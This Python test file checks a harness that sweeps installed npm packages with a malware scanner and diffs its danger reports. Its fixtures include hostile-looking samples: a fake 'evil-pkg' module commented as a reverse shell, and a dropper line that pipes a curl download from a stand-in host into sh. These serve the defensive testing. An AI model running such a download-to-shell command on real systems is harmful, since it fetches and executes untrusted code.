"""Contract tests for the checked-in corpus harness (build-loop follow-up F59).

Every calibration follow-up in this repo cites a corpus number, and until now
each one had to re-earn it with a throwaway script — which F43 could not do at
all (``MemoryError`` on an >8 MB bundle; I/O starvation on a 7,576-package
tree). ``scripts/corpus_sweep.py`` is that measurement as a command, and these
tests pin the four properties that make the number trustworthy rather than
merely produced:

1. **Attribution.** A nested dependency is measured as itself, a scope
   directory is not a package, npm's ``.bin`` bookkeeping is not a package, and
   a package that ships no scannable code is still *counted* — a corpus size
   that quietly drops the packages the phase cannot read would flatter every
   coverage claim made from it.
2. **No silent caps.** The per-file size cap, an unreadable file, and a sliced
   sweep are each counted and named in the report. The cap belongs to this
   harness, not to the shipped scanner, so a capped file is reported, never
   scanned-in-part.
3. **The inventory really is the walk.** A sweep must read the persisted
   inventory and never touch the directory walker — that is the whole reason a
   second run is cheap. Asserted by making the walker explode.
4. **The harness measures the product.** Its per-package hits and its
   danger/warning split must equal what ``sandbox_codescan`` +
   ``sandbox_check`` produce on the same tree; a harness that drifts from the
   shipped rules measures nothing.

Plus the truncation guard: a report that ends without its trailer is refused,
because a short corpus silently read as a complete one is exactly how a
calibration claim goes wrong.
"""

import json
import sys
from pathlib import Path

import pytest

_ROOT = Path(__file__).resolve().parents[1]
for _p in (_ROOT / "src", _ROOT / "scripts"):
    if str(_p) not in sys.path:
        sys.path.insert(0, str(_p))

import corpus_sweep  # noqa: E402
from corpus_sweep import (  # noqa: E402
    INVENTORY_SCHEMA,
    REPORT_SCHEMA,
    PackageInventory,
    TruncatedReport,
    aggregate,
    build_inventory,
    diff_reports,
    main,
    read_jsonl,
    resolve_package,
    sweep_package,
)
from sandbox_check import classify_malware_hits, is_dangerous_hit  # noqa: E402
from sandbox_codescan import scan_installed_package_code  # noqa: E402


# --------------------------------------------------------------------------- #
# Corpus fixture
# --------------------------------------------------------------------------- #

BENIGN_MODULE = """
'use strict';
module.exports = function add(a, b) {
  return a + b;
};
"""

# "shell backdoor" — an ALWAYS_DANGEROUS description, so one hit is a danger
# with no corroboration needed.
REVERSE_SHELL_MODULE = """
// establish a reverse shell back to the operator
const net = require('net');
"""

# "download piped to shell" — a second, independent always-dangerous shape, used
# to prove the size cap is what hides a finding rather than the pattern missing.
DROPPER_MODULE = """
run("curl https://example.invalid/p.sh | sh");
"""


def _write(path: Path, text: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


@pytest.fixture
def corpus(tmp_path: Path) -> Path:
    """A miniature installed tree covering every attribution case."""
    modules = tmp_path / "project" / "node_modules"

    _write(modules / "benign-pkg" / "package.json", '{"name":"benign-pkg"}')
    _write(modules / "benign-pkg" / "index.js", BENIGN_MODULE)
    _write(modules / "benign-pkg" / "README.md", "not code, must not be scanned")

    _write(modules / "evil-pkg" / "package.json", '{"name":"evil-pkg"}')
    _write(modules / "evil-pkg" / "index.js", REVERSE_SHELL_MODULE)

    # An extension-less `bin/` entry: only reachable if the within-package path
    # (not the absolute one) is what the selection rule sees.
    _write(modules / "evil-pkg" / "bin" / "cli", "#!/usr/bin/env node\n")

    _write(modules / "@scope" / "scoped-pkg" / "package.json", '{"name":"x"}')
    _write(modules / "@scope" / "scoped-pkg" / "lib" / "util.js", BENIGN_MODULE)

    # npm's own bookkeeping directory — not a package.
    _write(modules / ".bin" / "shim.js", BENIGN_MODULE)

    # A nested dependency: its file belongs to the inner package, not the outer.
    _write(modules / "outer-pkg" / "package.json", '{"name":"outer-pkg"}')
    _write(modules / "outer-pkg" / "index.js", BENIGN_MODULE)
    _write(
        modules / "outer-pkg" / "node_modules" / "inner-pkg" / "package.json",
        '{"name":"inner-pkg"}',
    )
    _write(
        modules / "outer-pkg" / "node_modules" / "inner-pkg" / "index.js",
        REVERSE_SHELL_MODULE,
    )

    # A declarations/data-only package: real, in the corpus, nothing to scan.
    _write(modules / "empty-pkg" / "package.json", '{"name":"empty-pkg"}')
    _write(modules / "empty-pkg" / "data.json", "{}")

    # A package whose only code is a large bundle carrying a real finding.
    _write(
        modules / "big-pkg" / "dist" / "bundle.js",
        DROPPER_MODULE + ("\n// " + "x" * 200) * 60,
    )
    return tmp_path


def _inventory(corpus_root: Path) -> dict:
    return {package.name: package for package in build_inventory([corpus_root])}


# --------------------------------------------------------------------------- #
# 1. Attribution
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    "relative, expected",
    [
        ("node_modules/left-pad/index.js", ("node_modules/left-pad", "left-pad", "index.js")),
        ("node_modules/left-pad", ("node_modules/left-pad", "left-pad", "")),
        (
            "node_modules/@scope/pkg/lib/a.js",
            ("node_modules/@scope/pkg", "@scope/pkg", "lib/a.js"),
        ),
        # The LAST node_modules wins: the inner package owns the file.
        (
            "node_modules/a/node_modules/b/index.js",
            ("node_modules/a/node_modules/b", "b", "index.js"),
        ),
        # Windows separators resolve identically.
        (
            r"node_modules\left-pad\index.js",
            ("node_modules/left-pad", "left-pad", "index.js"),
        ),
    ],
)
def test_resolve_package_attributes_paths(relative, expected):
    assert resolve_package(relative) == expected


@pytest.mark.parametrize(
    "relative",
    [
        "node_modules/.bin/tsc",  # npm bookkeeping, not a package
        "node_modules/@scope",  # a scope directory is not a package
        "node_modules",  # the container itself
        "src/index.js",  # outside any package, root is not one
    ],
)
def test_resolve_package_rejects_non_packages(relative):
    assert resolve_package(relative) is None


def test_inventory_finds_every_package_including_nested_and_codeless(corpus):
    found = _inventory(corpus)
    assert set(found) == {
        "benign-pkg",
        "evil-pkg",
        "@scope/scoped-pkg",
        "outer-pkg",
        "inner-pkg",
        "empty-pkg",
        "big-pkg",
    }
    # A package with nothing scannable is still in the corpus, with zero files —
    # not omitted, which would silently shrink every denominator.
    assert found["empty-pkg"].files == []


def test_inventory_selects_only_scannable_files(corpus):
    found = _inventory(corpus)
    assert [path for path, _size in found["evil-pkg"].files] == ["bin/cli", "index.js"]
    # README.md and package.json are not code and must not be counted.
    assert [path for path, _size in found["benign-pkg"].files] == ["index.js"]


def test_nested_package_files_are_not_double_counted(corpus):
    found = _inventory(corpus)
    assert [path for path, _size in found["outer-pkg"].files] == ["index.js"]
    assert [path for path, _size in found["inner-pkg"].files] == ["index.js"]


def test_package_keys_are_real_paths(corpus):
    """The key must be an openable directory, not string-glued path arithmetic.

    Caught by the first run against a real drive: with the root spelled ``G:/``
    — already ending in a separator — recovering a child's relative path by
    stripping the root prefix produced keys like ``G://G:/node_modules/x``,
    which no sweep could ever open. The walk now carries the relative path
    instead of re-deriving it.
    """
    for package in build_inventory([corpus]):
        assert Path(package.key).is_dir(), package.key
        assert "//" not in package.key.replace("://", ":/"), package.key


def test_a_root_with_a_trailing_separator_resolves_identically(corpus):
    plain = {p.key for p in build_inventory([corpus])}
    trailing = {p.key for p in build_inventory([Path(str(corpus) + "/")])}
    assert plain == trailing


def test_linked_directories_are_not_descended(corpus, tmp_path):
    """pnpm's virtual store is symlinks; on Windows a junction is not even a
    symlink to ``os.walk``. Following them is an unbounded walk, so they are
    skipped — and counted, never silently."""
    target = corpus / "project" / "node_modules" / "benign-pkg"
    link = corpus / "project" / "node_modules" / "linked-pkg"
    try:
        link.symlink_to(target, target_is_directory=True)
    except (OSError, NotImplementedError):
        pytest.skip("symlink creation is not permitted in this environment")

    seen = 0

    def count(links: int) -> None:
        nonlocal seen
        seen += links

    names = {p.name for p in build_inventory([corpus], on_links=count)}
    assert seen == 1
    # The link is registered as a package (the directory entry is real) but the
    # walk does not descend into it and duplicate the target's files.
    assert not any(p.files for p in build_inventory([corpus]) if p.name == "linked-pkg")
    assert "benign-pkg" in names


def test_inventory_is_deterministic(corpus):
    first = [(p.key, p.files) for p in build_inventory([corpus])]
    second = [(p.key, p.files) for p in build_inventory([corpus])]
    assert first == second


# --------------------------------------------------------------------------- #
# 2. No silent caps
# --------------------------------------------------------------------------- #


def test_oversize_file_is_counted_and_named_not_dropped(corpus):
    big = _inventory(corpus)["big-pkg"]
    result = sweep_package(big, max_file_bytes=64)

    assert result.files_scanned == 0
    assert result.files_oversize == 1
    assert result.oversize_examples[0][0] == "dist/bundle.js"
    # An incomplete package must never read as a clean one.
    assert result.complete is False


def test_the_cap_is_what_hid_the_finding(corpus):
    """Raising the cap surfaces a real danger in the same file."""
    big = _inventory(corpus)["big-pkg"]
    capped = sweep_package(big, max_file_bytes=64)
    uncapped = sweep_package(big, max_file_bytes=10 * 1024 * 1024)

    assert capped.dangers == {}
    assert "download piped to shell" in uncapped.dangers
    assert uncapped.complete is True


def test_a_file_that_grew_past_the_cap_is_reported_not_truncated(corpus, tmp_path):
    """The inventory's size is stale by construction; the read re-checks it."""
    package = _inventory(corpus)["big-pkg"]
    # Claim it is tiny, as a stale inventory would.
    package.files = [("dist/bundle.js", 10)]

    result = sweep_package(package, max_file_bytes=64)
    assert result.files_scanned == 0
    assert result.files_oversize == 1
    assert result.dangers == {}


def test_unreadable_file_is_counted_as_failed_not_scanned(corpus):
    package = _inventory(corpus)["benign-pkg"]
    package.files.append(("does-not-exist.js", 10))

    result = sweep_package(package, max_file_bytes=1024)
    assert result.files_scanned == 1
    assert result.files_failed == 1
    assert result.failed_examples[0][0] == "does-not-exist.js"
    assert result.complete is False


def test_a_scan_that_blows_up_does_not_end_the_sweep(corpus, monkeypatch):
    def explode(_content):
        raise MemoryError("simulated bundle blow-up")

    monkeypatch.setattr(corpus_sweep, "scan_text_for_malware_patterns", explode)
    result = sweep_package(_inventory(corpus)["evil-pkg"], max_file_bytes=1024)

    assert result.files_failed == 2
    assert result.files_scanned == 0
    assert result.failed_examples[0][1] == "MemoryError"


def test_a_read_that_blows_up_does_not_end_the_sweep(corpus, monkeypatch):
    """The allocation that actually failed on a real 3,000-package sweep.

    ``MemoryError`` was guarded around the *scan* but not the 2 MB *read* — and
    under machine-wide memory pressure it is the read that raises. One file must
    never end a 25-minute run.
    """
    calls = {"n": 0}
    real_read = corpus_sweep.read_capped

    def flaky(path, max_bytes):
        calls["n"] += 1
        if calls["n"] == 1:
            raise MemoryError()
        return real_read(path, max_bytes)

    monkeypatch.setattr(corpus_sweep, "read_capped", flaky)
    result = sweep_package(_inventory(corpus)["evil-pkg"], max_file_bytes=1024)

    assert result.files_failed == 1
    assert result.files_scanned == 1  # the run continued past the failure
    assert result.failed_examples[0][1] == "MemoryError"
    assert result.complete is False


def test_sliced_sweep_says_what_it_skipped(corpus, tmp_path, capsys):
    inventory_path = tmp_path / "corpus.inv.jsonl"
    report_path = tmp_path / "slice.jsonl"
    assert main(["inventory", "--root", str(corpus), "-o", str(inventory_path)]) == 0
    assert (
        main(
            [
                "sweep",
                "-i",
                str(inventory_path),
                "-o",
                str(report_path),
                "--start",
                "1",
                "--limit",
                "2",
            ]
        )
        == 0
    )

    stderr = capsys.readouterr().err
    assert "sweeping a slice" in stderr
    header, records, _trailer = read_jsonl(report_path, REPORT_SCHEMA)
    assert len(records) == 2
    assert header["slice"] == {"start": 1, "limit": 2, "available": 7}


def test_unscanned_packages_are_counted_separately(corpus, tmp_path):
    inventory_path = tmp_path / "corpus.inv.jsonl"
    report_path = tmp_path / "report.jsonl"
    assert main(["inventory", "--root", str(corpus), "-o", str(inventory_path)]) == 0
    assert main(["sweep", "-i", str(inventory_path), "-o", str(report_path)]) == 0

    _header, records, trailer = read_jsonl(report_path, REPORT_SCHEMA)
    assert trailer["totals"]["packages"] == 7
    # empty-pkg ships nothing this phase can read; it contributes no verdict.
    assert trailer["totals"]["packages_unscanned"] == 1
    assert aggregate(records) == trailer["totals"]


# --------------------------------------------------------------------------- #
# 3. The inventory really is the walk
# --------------------------------------------------------------------------- #


def test_sweep_never_re_walks_the_tree(corpus, tmp_path, monkeypatch):
    inventory_path = tmp_path / "corpus.inv.jsonl"
    assert main(["inventory", "--root", str(corpus), "-o", str(inventory_path)]) == 0

    def forbidden(*_args, **_kwargs):
        raise AssertionError("sweep re-walked the tree instead of using the inventory")

    monkeypatch.setattr(corpus_sweep, "_scandir_walk", forbidden)
    report_path = tmp_path / "report.jsonl"
    assert main(["sweep", "-i", str(inventory_path), "-o", str(report_path)]) == 0
    assert report_path.exists()


def test_sweep_streams_the_inventory_instead_of_loading_it(corpus, tmp_path, monkeypatch):
    """The sweep must never materialise the inventory.

    Found by running this harness against a real machine: the inventory of
    ``G:/`` is 143,010 package records over 168 MB, and reading them into a
    list raised ``MemoryError`` — the exact failure F59 exists to remove,
    reintroduced by the tool meant to fix it. ``read_jsonl`` remains for
    ``diff`` (a join genuinely needs both sides); the sweep may not touch it.
    """
    inventory_path = tmp_path / "corpus.inv.jsonl"
    assert main(["inventory", "--root", str(corpus), "-o", str(inventory_path)]) == 0

    def forbidden(*_args, **_kwargs):
        raise AssertionError("sweep loaded the whole inventory instead of streaming it")

    monkeypatch.setattr(corpus_sweep, "read_jsonl", forbidden)
    assert main(["sweep", "-i", str(inventory_path), "-o", str(tmp_path / "r.jsonl")]) == 0


def test_a_truncated_inventory_is_rejected_before_any_scanning(corpus, tmp_path, monkeypatch):
    """Bounds are checked from the file's two ends, not by parsing the middle."""
    inventory_path = tmp_path / "corpus.inv.jsonl"
    assert main(["inventory", "--root", str(corpus), "-o", str(inventory_path)]) == 0
    lines = inventory_path.read_text(encoding="utf-8").splitlines()
    inventory_path.write_text("\n".join(lines[:-1]) + "\n", encoding="utf-8")

    def forbidden(*_args, **_kwargs):
        raise AssertionError("a truncated inventory reached the scan")

    monkeypatch.setattr(corpus_sweep, "sweep_package", forbidden)
    assert main(["sweep", "-i", str(inventory_path), "-o", str(tmp_path / "r.jsonl")]) == 2


def test_verify_bounds_reads_only_the_two_ends(tmp_path):
    """A corrupt middle does not stop the bounds check — that is the point."""
    path = tmp_path / "corrupt-middle.jsonl"
    path.write_text(
        json.dumps({"kind": "header", "schema": REPORT_SCHEMA})
        + "\nnot json at all\n"
        + json.dumps({"kind": "trailer", "totals": {"packages": 9}})
        + "\n",
        encoding="utf-8",
    )
    header, trailer = corpus_sweep.verify_bounds(path, REPORT_SCHEMA)
    assert header["schema"] == REPORT_SCHEMA
    assert trailer["totals"]["packages"] == 9


def test_inventory_round_trips_through_json(corpus):
    original = _inventory(corpus)["evil-pkg"]
    restored = PackageInventory.from_json(json.loads(json.dumps(original.to_json())))
    assert (restored.key, restored.name, restored.files) == (
        original.key,
        original.name,
        original.files,
    )


def test_resume_reuses_finished_packages_and_matches_a_full_sweep(corpus, tmp_path):
    inventory_path = tmp_path / "corpus.inv.jsonl"
    full_path = tmp_path / "full.jsonl"
    resumed_path = tmp_path / "resumed.jsonl"
    assert main(["inventory", "--root", str(corpus), "-o", str(inventory_path)]) == 0
    assert main(["sweep", "-i", str(inventory_path), "-o", str(full_path)]) == 0

    # Simulate a kill mid-sweep: header + the first three packages, no trailer.
    lines = full_path.read_text(encoding="utf-8").splitlines()
    resumed_path.write_text("\n".join(lines[:4]) + "\n", encoding="utf-8")
    with pytest.raises(TruncatedReport):
        read_jsonl(resumed_path, REPORT_SCHEMA)

    assert (
        main(["sweep", "-i", str(inventory_path), "-o", str(resumed_path), "--resume"])
        == 0
    )
    _h1, full_records, t1 = read_jsonl(full_path, REPORT_SCHEMA)
    _h2, resumed_records, t2 = read_jsonl(resumed_path, REPORT_SCHEMA)
    assert resumed_records == full_records
    assert t2["totals"] == t1["totals"]


def test_a_resume_appends_and_never_discards_earlier_work(corpus, tmp_path):
    """A second interruption must not cost the work the first one survived.

    Rewriting the report on resume would do exactly that: the reused records
    live only in memory until the run finishes, so a kill mid-rewrite loses
    them. Appending keeps every finished package on disk the whole time.
    """
    inventory_path = tmp_path / "corpus.inv.jsonl"
    report = tmp_path / "report.jsonl"
    assert main(["inventory", "--root", str(corpus), "-o", str(inventory_path)]) == 0
    assert (
        main(["sweep", "-i", str(inventory_path), "-o", str(report), "--limit", "3"])
        == 0
    )
    first_three = [r["key"] for r in read_jsonl(report, REPORT_SCHEMA)[1]]

    before = report.read_text(encoding="utf-8")
    assert main(["sweep", "-i", str(inventory_path), "-o", str(report), "--resume"]) == 0
    after = report.read_text(encoding="utf-8")

    # Byte-for-byte prefix: the earlier run's lines were never rewritten.
    assert after.startswith(before)
    _header, records, trailer = read_jsonl(report, REPORT_SCHEMA)
    assert [r["key"] for r in records][:3] == first_three
    assert trailer["totals"]["packages"] == 7


def test_a_truncated_final_line_does_not_poison_a_resume(tmp_path):
    partial = tmp_path / "partial.jsonl"
    partial.write_text(
        json.dumps({"kind": "header", "schema": REPORT_SCHEMA})
        + "\n"
        + json.dumps({"kind": "package", "key": "a", "name": "a"})
        + "\n"
        + '{"kind": "package", "key": "b"',  # hard kill mid-write
        encoding="utf-8",
    )
    assert set(corpus_sweep._load_resume(partial)) == {"a"}


def test_a_report_without_a_trailer_is_refused(tmp_path):
    truncated = tmp_path / "short.jsonl"
    truncated.write_text(
        json.dumps({"kind": "header", "schema": INVENTORY_SCHEMA, "roots": []}) + "\n",
        encoding="utf-8",
    )
    with pytest.raises(TruncatedReport, match="no trailer line"):
        read_jsonl(truncated, INVENTORY_SCHEMA)


def test_a_report_of_the_wrong_schema_is_refused(tmp_path):
    wrong = tmp_path / "wrong.jsonl"
    wrong.write_text(
        json.dumps({"kind": "header", "schema": REPORT_SCHEMA})
        + "\n"
        + json.dumps({"kind": "trailer", "totals": {}})
        + "\n",
        encoding="utf-8",
    )
    with pytest.raises(TruncatedReport, match="expected"):
        read_jsonl(wrong, INVENTORY_SCHEMA)


# --------------------------------------------------------------------------- #
# 4. The harness measures the product
# --------------------------------------------------------------------------- #


def test_hits_agree_with_the_shipped_deep_code_phase(corpus):
    """Same tree, same hits: the harness must not drift from ``sandbox <pkg>``."""
    for name in ("benign-pkg", "evil-pkg", "@scope/scoped-pkg", "big-pkg"):
        package = _inventory(corpus)[name]
        shipped = scan_installed_package_code(Path(package.key))
        harness = sweep_package(package, max_file_bytes=10 * 1024 * 1024)

        shipped_counts: dict = {}
        for _path, description in shipped.hits:
            shipped_counts[description] = shipped_counts.get(description, 0) + 1
        harness_counts = dict(harness.dangers)
        harness_counts.update(harness.warnings)

        assert harness_counts == shipped_counts, name
        assert harness.files_scanned == shipped.files_scanned, name


def test_danger_warning_split_agrees_with_classify_malware_hits():
    """Anti-drift lock on the split this harness re-derives for its JSON keys.

    ``classify_malware_hits`` returns decorated strings; the report needs raw
    descriptions. The counts must match all the same, including the
    corroboration escalation (a capability in a file that also shows an attacker
    context signal), so a change to the classifier's rule fails here rather than
    silently changing what every future measurement calls a danger.
    """
    hits = [
        ("a.js", "child_process - command execution"),  # capability, alone
        ("b.js", "spawn() - process spawning"),  # capability...
        ("b.js", "shell process spawned"),  # ...with context: escalates
        ("c.js", "shell backdoor"),  # always dangerous
        ("c.js", "screen capture"),  # warning
    ]
    classification = classify_malware_hits(hits)
    escalated = set(classification.corroborated)
    dangers = {
        description: count
        for description, count in classification.counts.items()
        if is_dangerous_hit(description) or description in escalated
    }
    warnings = {
        description: count
        for description, count in classification.counts.items()
        if description not in dangers
    }

    assert len(dangers) == len(classification.dangers)
    assert len(warnings) == len(classification.warnings)
    assert set(dangers) == {
        "spawn() - process spawning",
        "shell process spawned",
        "shell backdoor",
    }
    assert set(warnings) == {"child_process - command execution", "screen capture"}


def test_benign_packages_produce_zero_dangers(corpus):
    found = _inventory(corpus)
    for name in ("benign-pkg", "@scope/scoped-pkg", "outer-pkg", "empty-pkg"):
        result = sweep_package(found[name], max_file_bytes=1024 * 1024)
        assert result.dangers == {}, name


def test_malicious_packages_produce_a_danger(corpus):
    found = _inventory(corpus)
    for name in ("evil-pkg", "inner-pkg"):
        result = sweep_package(found[name], max_file_bytes=1024 * 1024)
        assert "shell backdoor" in result.dangers, name


# --------------------------------------------------------------------------- #
# The diff — the reason the harness exists
# --------------------------------------------------------------------------- #


def _report(key, name, dangers=None, warnings=None, files=1):
    return {
        "kind": "package",
        "key": key,
        "name": name,
        "dangers": dangers or {},
        "warnings": warnings or {},
        "corroborated": [],
        "files_scanned": files,
        "bytes_scanned": 100,
        "files_oversize": 0,
        "files_failed": 0,
        "dir_errors": 0,
        "complete": True,
    }


def test_diff_reports_gained_and_lost_dangers():
    old = [
        _report("/c/a", "a", dangers={"shell process spawned": 1}),
        _report("/c/b", "b"),
        _report("/c/gone", "gone", dangers={"shell backdoor": 1}),
    ]
    new = [
        _report("/c/a", "a", warnings={"shell process spawned": 1}),
        _report("/c/b", "b", dangers={"credential theft": 2}),
        _report("/c/fresh", "fresh"),
    ]
    diff = diff_reports(old, new)

    assert diff["packages_gained_dangers"] == [
        {"key": "/c/b", "name": "b", "descriptions": ["credential theft"]}
    ]
    assert diff["packages_lost_dangers"] == [
        {"key": "/c/a", "name": "a", "descriptions": ["shell process spawned"]}
    ]
    assert diff["packages_only_in_old"] == ["/c/gone"]
    assert diff["packages_only_in_new"] == ["/c/fresh"]
    # Two dangers before, two after — the corpus total is unchanged while one
    # package gained a danger and another lost one. That cancellation is exactly
    # why the diff reports per-package movement and not only totals.
    assert diff["totals"]["delta"]["danger_occurrences"] == 0
    assert diff["totals"]["delta"]["warning_occurrences"] == 1


def test_diff_tracks_a_description_moving_from_danger_to_warning():
    """The shape a narrowing produces: same hits, demoted severity."""
    old = [_report("/c/a", "a", dangers={"shell process spawned": 3})]
    new = [_report("/c/a", "a", warnings={"shell process spawned": 3})]
    entry = diff_reports(old, new)["descriptions"]["shell process spawned"]

    assert entry["old"]["danger_packages"] == 1
    assert entry["new"]["danger_packages"] == 0
    assert entry["delta"] == {
        "danger_packages": -1,
        "warning_packages": 1,
        "occurrences": 0,
    }


def test_diff_omits_descriptions_that_did_not_move():
    old = [_report("/c/a", "a", warnings={"filesystem access": 2})]
    new = [_report("/c/a", "a", warnings={"filesystem access": 2})]
    assert diff_reports(old, new)["descriptions"] == {}


def test_diff_cli_fails_only_on_a_new_danger(tmp_path):
    def write(path, records):
        with path.open("w", encoding="utf-8") as handle:
            handle.write(json.dumps({"kind": "header", "schema": REPORT_SCHEMA}) + "\n")
            for record in records:
                handle.write(json.dumps(record) + "\n")
            handle.write(
                json.dumps({"kind": "trailer", "totals": aggregate(records)}) + "\n"
            )

    clean = tmp_path / "clean.jsonl"
    regressed = tmp_path / "regressed.jsonl"
    write(clean, [_report("/c/a", "a", dangers={"shell backdoor": 1})])
    write(regressed, [_report("/c/a", "a", dangers={"shell backdoor": 1, "x": 1})])

    # A narrowing that only REMOVES dangers passes the gate.
    assert main(["diff", str(regressed), str(clean), "--fail-on-new-dangers", "-q"]) == 0
    assert main(["diff", str(clean), str(regressed), "--fail-on-new-dangers", "-q"]) == 1
    # Without the flag the diff is a report, not a gate.
    assert main(["diff", str(clean), str(regressed), "-q"]) == 0


def test_diff_writes_machine_readable_output(tmp_path, corpus):
    inventory_path = tmp_path / "corpus.inv.jsonl"
    before = tmp_path / "before.jsonl"
    after = tmp_path / "after.jsonl"
    out = tmp_path / "diff.json"
    assert main(["inventory", "--root", str(corpus), "-o", str(inventory_path)]) == 0
    assert main(["sweep", "-i", str(inventory_path), "-o", str(before), "-q"]) == 0
    assert main(["sweep", "-i", str(inventory_path), "-o", str(after), "-q"]) == 0
    assert main(["diff", str(before), str(after), "-o", str(out), "-q"]) == 0

    diff = json.loads(out.read_text(encoding="utf-8"))
    # Two sweeps of an unchanged corpus are identical — the harness is stable.
    assert diff["packages_gained_dangers"] == []
    assert diff["packages_lost_dangers"] == []
    assert diff["descriptions"] == {}
    assert all(value == 0 for value in diff["totals"]["delta"].values())


# --------------------------------------------------------------------------- #
# CLI plumbing
# --------------------------------------------------------------------------- #


def test_inventory_rejects_a_missing_root(tmp_path):
    assert main(["inventory", "--root", str(tmp_path / "nope"), "-o", str(tmp_path / "i")]) == 2


def test_sweep_rejects_a_missing_inventory(tmp_path):
    assert main(["sweep", "-i", str(tmp_path / "nope"), "-o", str(tmp_path / "r")]) == 2


def test_sweep_rejects_a_truncated_inventory(tmp_path):
    inventory = tmp_path / "short.inv.jsonl"
    inventory.write_text(
        json.dumps({"kind": "header", "schema": INVENTORY_SCHEMA, "roots": []}) + "\n",
        encoding="utf-8",
    )
    assert main(["sweep", "-i", str(inventory), "-o", str(tmp_path / "r")]) == 2


def test_sweep_summary_prints_totals_json(corpus, tmp_path, capsys):
    inventory_path = tmp_path / "corpus.inv.jsonl"
    assert main(["inventory", "--root", str(corpus), "-o", str(inventory_path), "-q"]) == 0
    capsys.readouterr()
    assert (
        main(
            [
                "sweep",
                "-i",
                str(inventory_path),
                "-o",
                str(tmp_path / "r.jsonl"),
                "--summary",
                "-q",
            ]
        )
        == 0
    )
    totals = json.loads(capsys.readouterr().out)
    assert totals["packages"] == 7
    # evil-pkg + inner-pkg (shell backdoor) and big-pkg, whose bundle is under
    # the DEFAULT cap and so is read here — the same file the 64-byte cap hides
    # in `test_the_cap_is_what_hid_the_finding`.
    assert totals["packages_with_dangers"] == 3
